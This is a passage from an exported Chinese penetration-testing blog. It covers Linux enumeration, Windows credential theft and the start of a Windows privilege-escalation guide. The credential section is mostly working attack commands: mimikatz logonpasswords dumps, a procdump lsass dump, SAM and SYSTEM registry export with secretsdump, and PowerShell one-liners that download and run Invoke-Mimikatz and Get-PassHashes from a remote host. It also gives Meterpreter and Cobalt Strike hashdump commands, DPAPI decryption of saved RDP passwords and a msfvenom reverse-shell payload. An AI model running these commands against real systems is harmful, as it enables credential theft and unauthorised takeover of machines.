class="line">					  知DARPA网络符号名称</span><br></pre></td></tr></table></figure>

<h4 id="8-文件系统"><a href="#8-文件系统" class="headerlink" title="8 - 文件系统"></a>8 - 文件系统</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> /etc/profile		// /etc/profile 包含Linux系统环境和启动程序。 它被所有的用户使</span><br><span class="line">			  	   用于bash，ksh，sh shell。</span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> /etc/bashrc			// /etc/bashrc或者/etc/bash.bashrc是全系统的bash每个交互式</span><br><span class="line">			  	   shell启动文件。是使用系统广泛的功能和别名。</span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> ~/.bash_profile		// 类似 /etc/profile, 但仅适用于当前用户</span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> ~/.bash_history		//  打印当前用户bash命令的历史记录</span><br><span class="line"></span><br><span class="line"><span class="built_in">ls</span> <span class="literal">-al</span> /var/log/		// 列出所有日志文件</span><br><span class="line"></span><br><span class="line">find / <span class="literal">-perm</span> <span class="literal">-1000</span> <span class="literal">-type</span> d <span class="number">2</span>&gt;/dev/null	// 粘滞位 - 只有目录的所有者或文件的所有者可以在这里删</span><br><span class="line">			  		   除或重命名.</span><br><span class="line"></span><br><span class="line">find / <span class="literal">-perm</span> <span class="literal">-g</span>=s <span class="literal">-type</span> f <span class="number">2</span>&gt;/dev/null	// SGID（chmod <span class="number">2000</span>）-作为组运行，而不是启动它的用户。</span><br><span class="line"></span><br><span class="line">find / <span class="literal">-perm</span> <span class="literal">-u</span>=s <span class="literal">-type</span> f <span class="number">2</span>&gt;/dev/null	// SUID（chmod <span class="number">4000</span>）-作为所有者运行，而不是启动它的用户。</span><br><span class="line"></span><br><span class="line">find / ( <span class="literal">-perm</span> <span class="literal">-o</span> w <span class="literal">-perm</span> <span class="literal">-o</span> x ) <span class="literal">-type</span> d <span class="number">2</span>&gt;/dev/null		// 找出可写可执行的文件夹</span><br><span class="line"></span><br><span class="line">find / <span class="literal">-xdev</span> <span class="literal">-type</span> d ( <span class="literal">-perm</span> <span class="literal">-0002</span> <span class="literal">-a</span> ! <span class="literal">-perm</span> <span class="literal">-1000</span>) <span class="literal">-print</span>	// 找出可写的文件</span><br><span class="line"></span><br><span class="line">find /<span class="built_in">dir</span> <span class="literal">-xdev</span> ( <span class="literal">-nouser</span> <span class="literal">-o</span> <span class="literal">-nogroup</span> ) <span class="literal">-print</span>			// 找出不是所有者的文件</span><br></pre></td></tr></table></figure>

<h4 id="9-计划用户-crontab"><a href="#9-计划用户-crontab" class="headerlink" title="9 - 计划用户 - crontab"></a>9 - 计划用户 - crontab</h4><p>crond是linux下用来周期性的执行某种任务或等待处理某些事件的一个守护进程，当安装完成操作系统后，默认会 安装此服务 工具，并且会自动启动crond进程，crond进程每分钟会定期检查是否有要执行的任务，如果有要执行 的任务，则自动执行该任务。</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">crontab <span class="literal">-l</span> 				//显示当前用户crontab</span><br></pre></td></tr></table></figure>

<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">crontab [-<span class="type">u</span> <span class="type">username</span>] [-<span class="type">l</span>|-<span class="type">e</span>|-<span class="type">r</span>]</span><br><span class="line">参数：</span><br><span class="line"></span><br><span class="line"><span class="literal">-u</span>: 只有root才能进行这个任务，也即帮其他用户新建/删除crontab工作调度;</span><br><span class="line"></span><br><span class="line"><span class="literal">-e</span>: 编辑crontab 的工作内容;</span><br><span class="line"></span><br><span class="line"><span class="literal">-l</span>: 查阅crontab的工作内容;</span><br><span class="line"></span><br><span class="line"><span class="literal">-r</span>: 删除所有的crontab的工作内容，若仅要删除一项，请用<span class="literal">-e</span>去编辑。</span><br></pre></td></tr></table></figure>

<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="number">0</span>    <span class="number">12</span>   *   *   *    root /etc/init.d/smb restart</span><br><span class="line"><span class="comment">#分  时   日   月  周  |《==============命令行=======》|</span></span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>代表意义</th>
<th>分钟</th>
<th>小时</th>
<th>日期</th>
<th>月份</th>
<th>周</th>
<th>命令</th>
</tr>
</thead>
<tbody><tr>
<td>范围</td>
<td>0-59</td>
<td>0-23</td>
<td>1-31</td>
<td>1-12</td>
<td>0-7</td>
<td></td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>信息收集</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows密码凭证获取</title>
    <url>/2021/03/04/Windows%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/</url>
    <content><![CDATA[<h3 id="成殇Orz1"><a href="#成殇Orz1" class="headerlink" title="成殇Orz1"></a>成殇Orz1</h3><h3 id="0x00-Windows-Hash简介"><a href="#0x00-Windows-Hash简介" class="headerlink" title="0x00  Windows Hash简介"></a>0x00  Windows Hash简介</h3><h4 id="Windows-Hash"><a href="#Windows-Hash" class="headerlink" title="Windows Hash"></a>Windows Hash</h4><p>所谓哈希（hash），就是使用一种加密函数进行计算后的结果。这个加密函数对一个任意长度的字符串数据进行一 次数学加密函数运算，然后返回一个固定长度的字符串。 现在已经有了更新的NTLMv2以及Kerberos验证体系。</p>
<p>Windows系统使用两种方法对用户的密码进行哈希处理，它们分别是LAN Manager（LM）哈希和NT LAN Manager（NTLM）哈希Windows加密过的密码口令，我们称之为hash，Windows的系统密码hash默认情况下一般由两部分组成：第一 部分是LM-hash，第二部分是NTLM-hash。</p>
<span id="more"></span>

<p>Windows Hash格式：</p>
<figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line">用户名称<span class="symbol">:RID</span><span class="symbol">:LM-HASH</span>值<span class="symbol">:NT-HASH</span>值</span><br></pre></td></tr></table></figure>

<p>LM哈希密码最大长度为14，密码长度超过14位使用NTLM哈希</p>
<table>
<thead>
<tr>
<th></th>
<th>2000</th>
<th>xp</th>
<th>2003</th>
<th>Vista</th>
<th>win7</th>
<th>2008</th>
<th>2012</th>
</tr>
</thead>
<tbody><tr>
<td>LM</td>
<td>√</td>
<td>√</td>
<td>√</td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>NTLM</td>
<td>√</td>
<td>√</td>
<td>√</td>
<td>√</td>
<td>√</td>
<td>√</td>
<td>√</td>
</tr>
</tbody></table>
<h4 id="Windows-认证基础"><a href="#Windows-认证基础" class="headerlink" title="Windows 认证基础"></a>Windows 认证基础</h4><p>Windows的认证包括三个部分： </p>
<ul>
<li><p>本地认证：用户直接操作计算机登陆账户 </p>
</li>
<li><p>网络认证：远程连接到工作组中的某个设备 </p>
</li>
<li><p>域认证：登陆到域环境中的某个设备</p>
</li>
</ul>
<h4 id="Windows本地认证"><a href="#Windows本地认证" class="headerlink" title="Windows本地认证"></a>Windows本地认证</h4><ul>
<li><p>用户输入密码 </p>
</li>
<li><p>系统收到密码后将用户输入的密码计算成NTLM Hash </p>
</li>
<li><p>与sam数据库（%SystemRoot%\system32\config\sam）中该用户的哈希比对 </p>
</li>
<li><p>匹配则登陆成功，不匹配则登陆失败</p>
</li>
</ul>
<p>本地认证中用来处理用户输入密码的进程为lsass.exe,密码会在这个进程中明文保存，供该进程将密码计算成NTLM Hash与sam进行比对，我们使用mimikatz来获取的明文密码，便是在这个进程中读取到的</p>
<h3 id="0x01-系统用户密码凭证获取"><a href="#0x01-系统用户密码凭证获取" class="headerlink" title="0x01 系统用户密码凭证获取"></a>0x01 系统用户密码凭证获取</h3><h4 id="Mimikatz"><a href="#Mimikatz" class="headerlink" title="Mimikatz"></a>Mimikatz</h4><blockquote>
<p><a href="https://github.com/gentilkiwi/mimikatz/releases">https://github.com/gentilkiwi/mimikatz/releases</a></p>
</blockquote>
<h6 id="本地交互式"><a href="#本地交互式" class="headerlink" title="本地交互式"></a>本地交互式</h6><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">mimikatz.exe </span><br><span class="line">mimikatz # log res.txt</span><br><span class="line">mimikatz # privilege::debug</span><br><span class="line">mimikatz # token::elevate</span><br><span class="line">mimikatz # lsadump::sam</span><br><span class="line">mimikatz # <span class="keyword">exit</span></span><br></pre></td></tr></table></figure>

<h6 id="本地非交互式凭证获取"><a href="#本地非交互式凭证获取" class="headerlink" title="本地非交互式凭证获取"></a>本地非交互式凭证获取</h6><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">mimikatz.exe </span><br><span class="line">mimikatz # log logon.txt</span><br><span class="line">mimikatz # privilege::debug</span><br><span class="line">mimikatz # sekurlsa::logonpasswords</span><br><span class="line">mimikatz # <span class="keyword">exit</span></span><br></pre></td></tr></table></figure>

<h6 id="Powershell远程加载mimikatz脚本"><a href="#Powershell远程加载mimikatz脚本" class="headerlink" title="Powershell远程加载mimikatz脚本"></a>Powershell远程加载mimikatz脚本</h6><blockquote>
<p><a href="https://github.com/PowerShellMafia/PowerSploit/raw/master/Exfiltration/Invoke-Mimikatz.ps1">https://github.com/PowerShellMafia/PowerSploit/raw/master/Exfiltration/Invoke-Mimikatz.ps1</a></p>
</blockquote>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">powershell IEX (New-Object <span class="built_in">Net</span>.WebClient).DownloadString(&#x27;http://ip:prot/Invoke-Mimikatz.ps1&#x27;);Invoke-Mimikatz –DumpCreds</span><br></pre></td></tr></table></figure>

<h6 id="Powershell加载Get-PassHashes脚本"><a href="#Powershell加载Get-PassHashes脚本" class="headerlink" title="Powershell加载Get-PassHashes脚本"></a>Powershell加载Get-PassHashes脚本</h6><blockquote>
<p><a href="https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Get-PassHashes.ps1">https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Get-PassHashes.ps1</a></p>
</blockquote>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">powershell IEX(new-object <span class="built_in">net</span>.webclient).downloadstring(&#x27;http://<span class="number">47</span>.x.x.<span class="number">85</span>/Get-PassHashes.ps1&#x27;);Get-PassHashes</span><br></pre></td></tr></table></figure>

<h4 id="WCE"><a href="#WCE" class="headerlink" title="WCE"></a>WCE</h4><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">官网地址：https:<span class="regexp">//</span>www.ampliasecurity.com/research.html</span><br><span class="line"><span class="number">32</span>位下载：https:<span class="regexp">//</span>www.ampliasecurity.com<span class="regexp">/research/</span>wce_v1_42beta_x32.zip</span><br><span class="line"><span class="number">64</span>位下载：https:<span class="regexp">//</span>www.ampliasecurity.com<span class="regexp">/research/</span>wce_v1_42beta_x64.zip</span><br><span class="line">历史版本下载：https:<span class="regexp">//</span>www.ampliasecurity.com<span class="regexp">/research/</span>windows-credentials-editor/</span><br></pre></td></tr></table></figure>

<p><img src="/2021/03/04/Windows%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/1.jpg"></p>
<h4 id="Pwddump7"><a href="#Pwddump7" class="headerlink" title="Pwddump7"></a>Pwddump7</h4><p>这款工具可以读取出当前系统的各个用户的密码hash (包括LM和NTLM)。 在命令行输入Pwddump7.txt就可以读取出hash并显示出来，也可以保存到一个文件中。</p>
<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line"><span class="module-access"><span class="module"><span class="identifier">Pwddump7</span>.</span></span>exe &gt; pass.txt</span><br></pre></td></tr></table></figure>

<p>得到</p>
<p><img src="/2021/03/04/Windows%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/2.jpg"></p>
<h4 id="Procdump-Mimikatz"><a href="#Procdump-Mimikatz" class="headerlink" title="Procdump+Mimikatz"></a>Procdump+Mimikatz</h4><blockquote>
<p><a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdum">https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdum</a></p>
</blockquote>
<p>Procdump lsass 进程导出: </p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="keyword">For</span> <span class="number">32</span>bits：</span><br><span class="line">procdump.exe -accepteula -ma lsass.exe lsass.dmp </span><br><span class="line"><span class="keyword">For</span> <span class="number">64</span>bits：</span><br><span class="line">procdump.exe -accepteula -<span class="number">64</span> -ma lsass.exe lsass.dmp</span><br></pre></td></tr></table></figure>

<p>然后使用mimikatz还原密码：</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">mimikatz.exe</span><br><span class="line"><span class="function">sekurlsa::<span class="title">minidump</span> <span class="title">lsass.dmp</span></span></span><br><span class="line"><span class="function"><span class="title">sekurlsa</span>::<span class="title">logonPasswords</span> <span class="title">full</span></span></span><br><span class="line"><span class="function"><span class="title">exit</span></span></span><br></pre></td></tr></table></figure>

<h4 id="注册表导出hash"><a href="#注册表导出hash" class="headerlink" title="注册表导出hash"></a>注册表导出hash</h4><blockquote>
<p><a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdum">https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdum</a></p>
</blockquote>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">reg save HKLM\SYSTEM system.hiv</span><br><span class="line">reg save HKLM\SAM sam.hiv</span><br><span class="line">reg save HKLM\SECURITY security.hiv</span><br></pre></td></tr></table></figure>

<h6 id="Mimikatz-1"><a href="#Mimikatz-1" class="headerlink" title="Mimikatz"></a>Mimikatz</h6><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">mimikatz.exe</span><br><span class="line"><span class="function">lsadump::<span class="title">sam</span> /<span class="title">system:system</span>.<span class="title">hiv</span> /<span class="title">sam:sam</span>.<span class="title">hiv</span></span></span><br><span class="line"><span class="function"><span class="title">exit</span></span></span><br></pre></td></tr></table></figure>

<h6 id="python脚本"><a href="#python脚本" class="headerlink" title="python脚本"></a>python脚本</h6><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">python secretsdump.py -sam sam.hiv -security security.hiv -system system.hiv LOCAL</span><br></pre></td></tr></table></figure>

<h4 id="LaZagne"><a href="#LaZagne" class="headerlink" title="LaZagne"></a>LaZagne</h4><blockquote>
<p><a href="https://github.com/AlessandroZ/LaZagne">https://github.com/AlessandroZ/LaZagne</a></p>
</blockquote>
<p><img src="/2021/03/04/Windows%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/3.jpg"></p>
<h4 id="Meterpreter"><a href="#Meterpreter" class="headerlink" title="Meterpreter"></a>Meterpreter</h4><h6 id="Hashdump"><a href="#Hashdump" class="headerlink" title="Hashdump"></a>Hashdump</h6><p>获取system权限</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">meterpreter</span> &gt; getsystem</span><br><span class="line">meterpreter &gt; getuid</span><br></pre></td></tr></table></figure>

<p>获取hash值</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">use post/windows/gather/hashdump		//system权限的meterpreter</span><br><span class="line"><span class="built_in">set</span> session <span class="number">1</span></span><br><span class="line">exploit						//结果保存在tmp目录下</span><br></pre></td></tr></table></figure>

<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">use post/windows/gather/smart_hashdump</span><br><span class="line"><span class="built_in">set</span> session <span class="number">1</span></span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>

<h6 id="Mimikatz-2"><a href="#Mimikatz-2" class="headerlink" title="Mimikatz"></a>Mimikatz</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; load kiwi</span><br><span class="line">meterpreter &gt; <span class="built_in">help</span> kiwi</span><br></pre></td></tr></table></figure>

<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">#列举系统中的明文密码</span><br><span class="line">meterpreter &gt; creds_all</span><br><span class="line">#读取sam文件</span><br><span class="line">meterpreter &gt; lsa_dump_sam</span><br><span class="line">#kiwi_cmd命令后面接mimikatz.exe的命令</span><br><span class="line">meterpreter &gt; kiwi_cmd sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure>

<h4 id="Cobaltstrike"><a href="#Cobaltstrike" class="headerlink" title="Cobaltstrike"></a>Cobaltstrike</h4><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">beacon&gt; hashdump</span><br><span class="line">beacon&gt; logonpasswords</span><br><span class="line">beacon&gt; mimikatz sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure>

<h3 id="0x02-Hash解密"><a href="#0x02-Hash解密" class="headerlink" title="0x02  Hash解密"></a>0x02  Hash解密</h3><blockquote>
<p><a href="https://www.objectif-securite.ch/ophcrack">https://www.objectif-securite.ch/ophcrack</a></p>
</blockquote>
<h6 id="Ophcrack"><a href="#Ophcrack" class="headerlink" title="Ophcrack"></a>Ophcrack</h6><p>如果网站无法破解出hash值，可以使用ophcrack工具配合彩虹表破解。 </p>
<p>工具下载：<a href="https://ophcrack.sourceforge.io/">https://ophcrack.sourceforge.io/</a> </p>
<p>彩虹表： <a href="https://ophcrack.sourceforge.io/tables.php">https://ophcrack.sourceforge.io/tables.php</a> <a href="http://project-rainbowcrack.com/table.htm">http://project-rainbowcrack.com/table.htm</a></p>
<h3 id="0x03-其他密码获取"><a href="#0x03-其他密码获取" class="headerlink" title="0x03  其他密码获取"></a>0x03  其他密码获取</h3><h4 id="获取RDP连接密码"><a href="#获取RDP连接密码" class="headerlink" title="获取RDP连接密码"></a>获取RDP连接密码</h4><h6 id="获取链接记录"><a href="#获取链接记录" class="headerlink" title="获取链接记录"></a>获取链接记录</h6><blockquote>
<p><a href="https://github.com/3gstudent/List-RDP-Connections-History.git">https://github.com/3gstudent/List-RDP-Connections-History.git</a></p>
</blockquote>
<h6 id="mimikatz解密"><a href="#mimikatz解密" class="headerlink" title="mimikatz解密"></a>mimikatz解密</h6><p>查看本地机器本地连接过的目标机器：</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">reg query &quot;HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers&quot; /s</span><br></pre></td></tr></table></figure>

<p><img src="/2021/03/04/Windows%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/4.jpg"></p>
<p>查看本地用户此目录下是否存有RDP密码文件：</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="built_in">dir</span> /a <span class="variable">%userprofile%</span>\AppData\Local\Microsoft\Credentials\*</span><br></pre></td></tr></table></figure>

<p><img src="/2021/03/04/Windows%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/5.jpg"></p>
<p>查看保存在本地的远程主机信息：</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">cmdkey /list</span><br></pre></td></tr></table></figure>

<p>选择一个密码文件对其进行解密：</p>
<figure class="highlight taggerscript"><table><tr><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">dpapi::cred</span><br><span class="line">/in:C:<span class="symbol">\U</span>sers<span class="symbol">\4</span>600<span class="symbol">\A</span>ppData<span class="symbol">\L</span>ocal<span class="symbol">\M</span>icrosoft<span class="symbol">\C</span>redentials<span class="symbol">\D</span>FBE70A7E5CC19A398EBF1B96859CE5D</span><br></pre></td></tr></table></figure>

<p>此处需要记录下<code>guidMasterKey</code>的值，待会要通过<code>guidMasterKey</code>找对应的<code>Masterkey</code>。</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">guidMasterKey : &#123;<span class="number">56</span>dc62ge-<span class="number">0</span>af9-<span class="number">4925</span>-bf07-f54ba502a40a&#125;</span><br></pre></td></tr></table></figure>

<p>根据guidMasterKey找到对应的Masterkey：</p>
<figure class="highlight arduino"><table><tr><td class="code"><pre><span class="line">sekurlsa::dpapi</span><br></pre></td></tr></table></figure>

<p>通过Masterkey解密pbData数据，拿到明文RDP连接密码：</p>
<figure class="highlight taggerscript"><table><tr><td class="code"><pre><span class="line">dpapi::cred</span><br><span class="line">/in:C:<span class="symbol">\U</span>sers<span class="symbol">\4</span>600<span class="symbol">\A</span>ppData<span class="symbol">\L</span>ocal<span class="symbol">\M</span>icrosoft<span class="symbol">\C</span>redentials<span class="symbol">\2</span>A203AFB09B575A760E88FA341B9E354</span><br><span class="line">/masterkey:2d72835b9c08a9332106c23017ee6c0a0be9a368de34c1f6acc6d34dc0de8bc264729bd7736</span><br><span class="line">f806e9456544841564be0d5e9564090a7bb143ac32579adabb02a</span><br></pre></td></tr></table></figure>

<h4 id="Mysql数据库密码破解"><a href="#Mysql数据库密码破解" class="headerlink" title="Mysql数据库密码破解"></a>Mysql数据库密码破解</h4><p>一旦获取了网站一定的权限后，如果能够获取MySQL中保存用户数据，通过解密后，即可通过正常途径来访问 数据库；一方面可以直接操作数据库中的数据，另一方面可以用来提升权限。 </p>
<p>MySQL数据库用户密码跟其它数据库用户密码一样，在应用系统代码中都是以明文出现的，在获取文件读取权 限后即可直接从数据库连接文件中读取 一般都包含有数据库类型，物理位置，用户名和密码等信息</p>
<h5 id="MYSQL数据库文件类型"><a href="#MYSQL数据库文件类型" class="headerlink" title="MYSQL数据库文件类型"></a>MYSQL数据库文件类型</h5><p>MYSQL数据库文件共有“frm”、“MYD”“和MYI”三种文件</p>
<ul>
<li>“.frm” 是描述表结构的文件 </li>
<li>“.MYD” 是表的数据文件 </li>
<li>“.MYI” 是表数据文件中任何索引的数据树</li>
</ul>
<p>与用户相关的一共有三个文件即user.frm、user.MYD、user.MYI，MYSQL数据库用户密码都保存在user.MYD 文件中，包括root用户和其他用户的密码</p>
<h5 id="MYSQL加密方式"><a href="#MYSQL加密方式" class="headerlink" title="MYSQL加密方式"></a>MYSQL加密方式</h5><p>MYSQL数据库的认证密码有两种方式：</p>
<ul>
<li>MYSQL 4.1版本之前是MYSQL323加密 </li>
<li>MYSQL 4.1和之后的版本都是MYSQLSHA1加密</li>
</ul>
<p>MYSQL数据库中自带Old_Password（str）和Password（str）函数,它们均可以在MYSQL数据库里进行查询， 前者是MYSQL323加密，后者是MYSQLSHA1方式加密。 MYSQL323加密中生成的是16位字符串，而在MYSQLSHA1中生存的是41位字符串，其中*是不加入实际的密 码运算中，MYSQLSHA1加密的密码的实际位数是40位</p>
<h5 id="获取MYSQL密码"><a href="#获取MYSQL密码" class="headerlink" title="获取MYSQL密码"></a>获取MYSQL密码</h5><p>用winhex编辑器打开user.MYD文件，使用二进制模式查看，即可得到密码Hash值：</p>
<p><img src="/2021/03/04/Windows%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/6.jpg"></p>
<h5 id="Hash破解"><a href="#Hash破解" class="headerlink" title="Hash破解"></a>Hash破解</h5><ul>
<li><a href="http://www.cmd5.com/">www.cmd5.com</a> </li>
<li><a href="http://www.somd5.com/">www.somd5.com</a></li>
</ul>
<h4 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h4><h6 id="SharpDecryptPwd"><a href="#SharpDecryptPwd" class="headerlink" title="SharpDecryptPwd"></a>SharpDecryptPwd</h6><p><img src="/2021/03/04/Windows%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/7.jpg"></p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows提权</title>
    <url>/2021/03/22/Windows%E4%B8%BB%E6%9C%BA%E6%8F%90%E6%9D%83/</url>
    <content><![CDATA[<h3 id="成殇Orz1"><a href="#成殇Orz1" class="headerlink" title="成殇Orz1"></a>成殇Orz1</h3><h3 id="0x00-权限提升概述"><a href="#0x00-权限提升概述" class="headerlink" title="0x00 权限提升概述"></a>0x00 权限提升概述</h3><h5 id="提权概述"><a href="#提权概述" class="headerlink" title="提权概述"></a>提权概述</h5><p>权限提升（privilege escalation）：攻击者通过安全漏洞把获取到的受限制的低权限用户突破限制，提权至高权限 的管理员用户，从而获得对整个系统得控制权。 </p>
<span id="more"></span>

<h5 id="Windows系统内置用户和组"><a href="#Windows系统内置用户和组" class="headerlink" title="Windows系统内置用户和组"></a>Windows系统内置用户和组</h5><p>内置用户：</p>
<ul>
<li><p>Administrator：系统管理员账户，拥有完全的控制权限</p>
</li>
<li><p>Guest：来宾账户，供访问共享资源的网络用户使用，仅有最基本的权限，默认被禁用</p>
</li>
</ul>
<p>内置用户组：</p>
<ul>
<li><p>Administrators：管理员组</p>
</li>
<li><p>Users：新建用的默认所属的组</p>
</li>
<li><p>Guests：来宾组，权限最低</p>
</li>
</ul>
<figure class="highlight crmsh"><table><tr><td class="code"><pre><span class="line">Windows：<span class="keyword">user</span> <span class="title">--&gt; administrator</span></span><br><span class="line">Linux：<span class="keyword">user</span> <span class="title">--&gt; root</span></span><br></pre></td></tr></table></figure>

<h5 id="提权分类"><a href="#提权分类" class="headerlink" title="提权分类"></a>提权分类</h5><p>本地提权：在一个低权限用户下，通过一些条件（应用程序漏洞、系统漏洞等）直接提升到系统最高权限。 </p>
<p>远程提权：攻击者通过漏洞利用程序直接获取远程服务器的权限。</p>
<p>纵向提权：低权限角色获得高权限角色的权限。</p>
<p>横向提权：获取同级别角色的权限。</p>
<h5 id="提权条件"><a href="#提权条件" class="headerlink" title="提权条件"></a>提权条件</h5><ul>
<li>拥有Webshell，普通用户权限 </li>
<li>拥有某些软件的账号密码 </li>
<li>本地或远程服务器上存在漏洞 </li>
<li>拥有漏洞利用工具代码</li>
</ul>
<h5 id="Windows提权思路-•"><a href="#Windows提权思路-•" class="headerlink" title="Windows提权思路 •"></a>Windows提权思路 •</h5><ul>
<li>前期信息收集 </li>
<li>Meterpreter提权 </li>
<li>Windows系统内核漏洞 </li>
<li>Windows服务漏洞 </li>
<li>Windwos注册表</li>
</ul>
<h3 id="0x01-Windows提权信息收集"><a href="#0x01-Windows提权信息收集" class="headerlink" title="0x01 Windows提权信息收集"></a>0x01 Windows提权信息收集</h3><h5 id="获取meterpreter"><a href="#获取meterpreter" class="headerlink" title="获取meterpreter"></a>获取meterpreter</h5><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">msfvenom <span class="literal">-p</span> windows/meterpreter/reverse_tcp lhost=<span class="number">192.168</span>.<span class="number">31.246</span> lport=<span class="number">8882</span> <span class="operator">-f</span> exe <span class="literal">-o</span> xx.exe <span class="literal">-e</span></span><br><span class="line">x86/shikata_ga_nai <span class="literal">-i</span> <span class="number">8</span></span><br><span class="line"></span><br><span class="line">handler <span class="literal">-p</span> windows/meterpreter/reverse_tcp <span class="literal">-H</span> <span class="number">192.168</span>.<span class="number">31.246</span> <span class="literal">-P</span> <span class="number">8882</span></span><br></pre></td></tr></table></figure>

<p><img src="/2021/03/22/Windows%E4%B8%BB%E6%9C%BA%E6%8F%90%E6%9D%83/1.png"></p>
<h5 id="WMIC信息收集"><a href="#WMIC信息收集" class="headerlink" title="WMIC信息收集"></a>WMIC信息收集</h5><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#获取杀软名：</span></span><br><span class="line">WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List</span><br><span class="line"><span class="comment">#获取杀软名和安装路径：</span></span><br><span class="line">WMIC /namespace:\\root\securitycenter2 path antivirusproduct GET displayName,productState,pathToSignedProductExe</span><br><span class="line">wmic <span class="built_in">group</span>				<span class="comment">#组帐户管理。</span></span><br><span class="line">wmic os					<span class="comment">#已安装操作系统的管理。</span></span><br><span class="line">wmic <span class="keyword">process</span>				<span class="comment">#进程管理</span></span><br><span class="line">wmic service				<span class="comment">#服务应用程序管理。</span></span><br><span class="line">wmic useraccount			<span class="comment">#用户帐户管理。</span></span><br><span class="line">wmic startup				<span class="comment">#当用户登录到计算机系统时自动运行的命令的管理。</span></span><br><span class="line">wmic nic				<span class="comment">#网络接口控制器(NIC)管理</span></span><br></pre></td></tr></table></figure>

<h6 id="wmic信息提取脚本：wmic-info-bat"><a href="#wmic信息提取脚本：wmic-info-bat" class="headerlink" title="wmic信息提取脚本：wmic_info.bat"></a>wmic信息提取脚本：wmic_info.bat</h6><p><img src="/2021/03/22/Windows%E4%B8%BB%E6%9C%BA%E6%8F%90%E6%9D%83/2.png"></p>
<h5 id="SC信息收集"><a href="#SC信息收集" class="headerlink" title="SC信息收集"></a>SC信息收集</h5><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sc</span> query state= all</span><br></pre></td></tr></table></figure>

<p><img src="/2021/03/22/Windows%E4%B8%BB%E6%9C%BA%E6%8F%90%E6%9D%83/3.png"></p>
<h5 id="自动信息收集"><a href="#自动信息收集" class="headerlink" title="自动信息收集"></a>自动信息收集</h5><h6 id="Host-Information-Gathering-Script：HIGS-bat"><a href="#Host-Information-Gathering-Script：HIGS-bat" class="headerlink" title="Host Information Gathering Script：HIGS.bat"></a>Host Information Gathering Script：HIGS.bat</h6><figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">https</span>://github.com/myh<span class="number">0</span>st/scripts/blob/master/Windows%E<span class="number">4</span>%B<span class="number">8</span>%<span class="number">8</span>B%E<span class="number">4</span>%BF%A<span class="number">1</span>%E<span class="number">6</span>%<span class="number">81</span>%AF%E<span class="number">6</span>%<span class="number">9</span> <span class="number">4</span>%B<span class="number">6</span>%E<span class="number">9</span>%<span class="number">9</span>B%<span class="number">86</span>/HIGS.bat</span><br></pre></td></tr></table></figure>

<p><img src="/2021/03/22/Windows%E4%B8%BB%E6%9C%BA%E6%8F%90%E6%9D%83/4.png"></p>
